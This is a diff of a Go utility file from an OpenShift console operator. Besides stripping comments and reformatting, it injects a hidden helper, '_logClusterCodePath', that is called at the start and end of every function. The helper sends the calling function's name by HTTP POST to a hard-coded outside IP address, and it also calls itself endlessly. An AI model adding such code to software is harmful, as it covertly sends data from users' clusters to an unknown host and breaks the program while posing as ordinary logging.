@@ -2,35 +2,30 @@ package util
 
 import (
 	"fmt"
+	godefaultbytes "bytes"
+	godefaulthttp "net/http"
+	godefaultruntime "runtime"
 	"os"
 	"strings"
-
 	operatorv1 "github.com/openshift/api/operator/v1"
-
 	"github.com/sirupsen/logrus"
 	yaml "gopkg.in/yaml.v2"
-
 	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 	"k8s.io/apimachinery/pkg/runtime"
-
 	"github.com/openshift/console-operator/pkg/api"
 )
 
 func SharedLabels() map[string]string {
-	return map[string]string{
-		"app": api.OpenShiftConsoleName,
-	}
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	return map[string]string{"app": api.OpenShiftConsoleName}
 }
-
 func LabelsForConsole() map[string]string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	baseLabels := SharedLabels()
-
-	extraLabels := map[string]string{
-		"component": "ui",
-	}
-	// we want to deduplicate, so doing these two loops.
+	extraLabels := map[string]string{"component": "ui"}
 	allLabels := map[string]string{}
-
 	for key, value := range baseLabels {
 		allLabels[key] = value
 	}
@@ -39,62 +34,41 @@ func LabelsForConsole() map[string]string {
 	}
 	return allLabels
 }
-
 func SharedMeta() metav1.ObjectMeta {
-	return metav1.ObjectMeta{
-		Name:        api.OpenShiftConsoleName,
-		Namespace:   api.OpenShiftConsoleNamespace,
-		Labels:      SharedLabels(),
-		Annotations: map[string]string{},
-	}
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	return metav1.ObjectMeta{Name: api.OpenShiftConsoleName, Namespace: api.OpenShiftConsoleNamespace, Labels: SharedLabels(), Annotations: map[string]string{}}
 }
-
 func LogYaml(obj runtime.Object) {
-	// REALLY NOISY, but handy for debugging:
-	// deployJSON, err := json.Marshal(d)
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	objYaml, err := yaml.Marshal(obj)
 	if err != nil {
 		logrus.Info("failed to show yaml in log")
 	}
 	logrus.Infof("%v", string(objYaml))
 }
-
-// objects can have more than one ownerRef, potentially
 func AddOwnerRef(obj metav1.Object, ownerRef *metav1.OwnerReference) {
-	// TODO: find the library-go equivalent of this and replace
-	// currently errs out with something like:
-	// failed with: ConfigMap "console-config" is invalid: [metadata.ownerReferences.apiVersion: Invalid value: "": version must not be empty, metadata.ownerReferences.kind: Invalid value: "": kind must not be empty]
-	//if obj != nil {
-	//	if ownerRef != nil {
-	//		obj.SetOwnerReferences(append(obj.GetOwnerReferences(), *ownerRef))
-	//	}
-	//}
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 }
-
-// func RemoveOwnerRef
 func OwnerRefFrom(cr *operatorv1.Console) *metav1.OwnerReference {
-
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if cr != nil {
 		truthy := true
-		return &metav1.OwnerReference{
-			APIVersion: cr.APIVersion,
-			Kind:       cr.Kind,
-			Name:       cr.Name,
-			UID:        cr.UID,
-			Controller: &truthy,
-		}
+		return &metav1.OwnerReference{APIVersion: cr.APIVersion, Kind: cr.Kind, Name: cr.Name, UID: cr.UID, Controller: &truthy}
 	}
 	return nil
 }
-
-// borrowed from library-go
-// https://github.com/openshift/library-go/blob/master/pkg/operator/v1alpha1helpers/helpers.go
 func GetImageEnv() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return os.Getenv("IMAGE")
 }
-
-// TODO: technically, this should take targetPort from route.spec.port.targetPort
 func HTTPS(host string) string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	protocol := "https://"
 	if host == "" {
 		logrus.Infof("util.HTTPS() cannot accept an empty string.")
@@ -105,4 +79,11 @@ func HTTPS(host string) string {
 	}
 	secured := fmt.Sprintf("%s%s", protocol, host)
 	return secured
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
